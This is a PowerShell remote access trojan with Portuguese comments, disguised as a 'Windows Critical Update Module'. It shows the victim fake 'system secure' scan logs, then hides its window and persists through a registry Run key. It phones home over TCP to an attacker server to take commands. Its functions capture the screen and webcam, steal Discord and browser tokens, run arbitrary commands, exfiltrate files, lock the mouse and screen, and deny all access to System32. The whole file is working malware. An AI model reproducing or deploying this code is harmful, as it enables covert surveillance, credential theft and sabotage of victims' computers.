<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module - Complete Control
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "1981.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"

# ===== MUTEX =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $host.UI.RawUI.ForegroundColor = "Red"
    Write-Host ""
    Write-Host "╔════════════════════════════════════════════════════════════╗"
    Write-Host "║                    ERRO DE EXECUÇÃO                        ║"
    Write-Host "╠════════════════════════════════════════════════════════════╣"
    Write-Host "║  Este programa requer privilégios de ADMINISTRADOR!       ║"
    Write-Host "╚════════════════════════════════════════════════════════════╝"
    Write-Host ""
    $host.UI.RawUI.ForegroundColor = "White"
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $newUsers = $users | Where-Object { $_ -ne $UserName }
            $newUsers | Set-Content $userListFile -Force
            $removido = $true
        }
        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
        foreach ($task in $tasks) { Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue; $removido = $true }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { return "ERRO_AO_REMOVER" }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { return "ERRO_AO_LISTAR" }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { return $false }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== LOGS FAKES =====
$host.UI.RawUI.ForegroundColor = "Green"
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "    Versao 10.0.19045.1" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Milliseconds 500

$logs = @(
    "Inicializando modulo de verificacao do sistema...",
    "Carregando bibliotecas de analise...",
    "Verificando integridade do sistema...",
    "Escaneando arquivos criticos do Windows...",
    "Analisando processos em execucao...",
    "Detectando possiveis ameacas..."
)

foreach ($log in $logs) {
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $log" -ForegroundColor Gray
    Start-Sleep -Milliseconds 300
}

Write-Host ""
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] VERIFICACAO CONCLUIDA - SISTEMA SEGURO" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNCOES PRINCIPAIS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch {
        return "SCREEN_ERROR"
    }
}

# ===== MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        return "TEXT_ERROR" 
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                FullName = $_.FullName
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
                Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        return "DOWNLOAD_ERROR" 
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($result)) { $result = "Comando executado" }
        return $result
    } catch {
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        return "TOKENS_ERROR"
    }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "SYSTEM32_ERROR"
    }
}

# ===== TELA PRETA =====
function Black-Screen {
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.BackColor = 'Black'
        $form.ControlBox = $false
        $form.ShowInTaskbar = $false
        $form.KeyPreview = $true
        $form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $form.Close() } })
        $form.ShowDialog()
        return "BLACK_SCREEN"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        foreach ($f in [System.Windows.Forms.Application]::OpenForms) {
            if ($f.BackColor -eq [System.Drawing.Color]::Black -and $f.WindowState -eq 'Maximized') {
                $f.Close()
            }
        }
        return "SCREEN_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== TRAVAR MOUSE =====
$global:mouseLocked = $false
$global:lockThread = $null

function Lock-Mouse {
    try {
        if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        $global:mouseLocked = $true
        
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            using System.Windows.Forms;
            public class MouseLocker {
                [DllImport("user32.dll")]
                public static extern bool ClipCursor(ref RECT lpRect);
                [StructLayout(LayoutKind.Sequential)]
                public struct RECT { public int left, top, right, bottom; }
                public static void Lock() {
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
                    ClipCursor(ref rect);
                }
                public static void Unlock() {
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0;
                    rect.right = Screen.PrimaryScreen.Bounds.Width;
                    rect.bottom = Screen.PrimaryScreen.Bounds.Height;
                    ClipCursor(ref rect);
                }
            }
"@ -ReferencedAssemblies "System.Windows.Forms.dll"
        
        $global:lockThread = [System.Threading.Thread]::new({
            while ($global:mouseLocked) {
                [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                [MouseLocker]::Lock()
                Start-Sleep -Milliseconds 10
            }
        })
        $global:lockThread.IsBackground = $true
        $global:lockThread.Start()
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $global:mouseLocked = $false
        if ($global:lockThread -and $global:lockThread.IsAlive) { $global:lockThread.Abort() }
        [MouseLocker]::Unlock()
        return "MOUSE_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        $filename = "$env:TEMP\mic_$(Get-Random).wav"
        Add-Type -AssemblyName System.Speech
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $speech.SetInputToDefaultAudioDevice()
        $speech.RecognizeAsyncTimeout = 5000
        $speech.RecognizeAsync()
        Start-Sleep -Seconds 5
        $speech.RecognizeAsyncStop()
        if (Test-Path $filename) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
            Remove-Item $filename -Force
            return "AUDIO:$content"
        }
        return "AUDIO_ERROR"
    } catch {
        return "AUDIO_ERROR"
    }
}

# ===== WEBCAM =====
function Get-Webcam {
    try {
        Add-Type @"
            using System;
            using System.Drawing;
            using System.Runtime.InteropServices;
            using System.Windows.Forms;
            public class WebcamCapture {
                [DllImport("avicap32.dll")]
                public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
                [DllImport("user32.dll")]
                public static extern int SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
                [DllImport("user32.dll")]
                public static extern bool DestroyWindow(IntPtr hWnd);
                const int WM_CAP_CONNECT = 0x400 + 10;
                const int WM_CAP_DISCONNECT = 0x400 + 11;
                const int WM_CAP_GET_FRAME = 0x400 + 12;
                const int WM_CAP_SAVEDIB = 0x400 + 25;
                public static string Capture() {
                    IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
                    if (hWnd != IntPtr.Zero) {
                        SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
                        SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
                        string filename = System.IO.Path.GetTempFileName() + ".bmp";
                        IntPtr pFilename = Marshal.StringToHGlobalAnsi(filename);
                        SendMessage(hWnd, WM_CAP_SAVEDIB, 0, pFilename);
                        Marshal.FreeHGlobal(pFilename);
                        SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
                        DestroyWindow(hWnd);
                        if (System.IO.File.Exists(filename)) {
                            byte[] bytes = System.IO.File.ReadAllBytes(filename);
                            System.IO.File.Delete(filename);
                            return Convert.ToBase64String(bytes);
                        }
                    }
                    return null;
                }
            }
"@ -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll"
        $frame = [WebcamCapture]::Capture()
        if ($frame) { return "WEBCAM:$frame" }
        return "WEBCAM_ERROR"
    } catch {
        return "WEBCAM_ERROR"
    }
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name, CPU, WorkingSet, Id | ConvertTo-Json -Compress
        return $processes
    } catch {
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        return "URL_OPENED"
    } catch {
        return "URL_ERROR"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch { 
        return "POWER_ERROR" 
    }
}

# ===== PERSISTENCIA =====
function Install-Persistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    } catch {}
    attrib +h +s +r $scriptPath
}

if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-Persistence
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            switch -Wildcard ($cmd) {
                "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                "click" { $writer.WriteLine((Click-Mouse)) }
                "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
                "discord" { $writer.WriteLine((Get-DiscordToken)) }
                "block_system32" { $writer.WriteLine((Block-System32)) }
                "black_screen" { $writer.WriteLine((Black-Screen)) }
                "unlock_screen" { $writer.WriteLine((Unlock-Screen)) }
                "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
                "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
                "mic" { $writer.WriteLine((Get-Microphone)) }
                "webcam" { $writer.WriteLine((Get-Webcam)) }
                "processes" { $writer.WriteLine((Get-ProcessList)) }
                "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
                "reboot" { $writer.WriteLine((Power-Control "reboot")) }
                "list_users" { $writer.WriteLine((Get-RATUsers)) }
                "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
                "test" { $writer.WriteLine("PONG") }
                "exit" { break }
                default {
                    if ($cmd -match "^move (.+) (.+)$") {
                        $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
                    } elseif ($cmd -match "^key (.+)$") {
                        $writer.WriteLine((Send-Key $matches[1]))
                    } elseif ($cmd -match "^type (.+)$") {
                        $writer.WriteLine((Send-Text $matches[1]))
                    } elseif ($cmd -match "^ls (.+)$") {
                        $writer.WriteLine((Get-FileList $matches[1]))
                    } elseif ($cmd -match "^download (.+)$") {
                        $writer.WriteLine((Download-File $matches[1]))
                    } elseif ($cmd -match "^exec (.+)$") {
                        $writer.WriteLine((Execute-Command $matches[1]))
                    } elseif ($cmd -match "^url (.+)$") {
                        $writer.WriteLine((Open-Url $matches[1]))
                    } elseif ($cmd -match "^remove_user (.+)$") {
                        $writer.WriteLine((Remove-UserFromRAT $matches[1]))
                    } else {
                        $writer.WriteLine("Comando nao reconhecido")
                    }
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
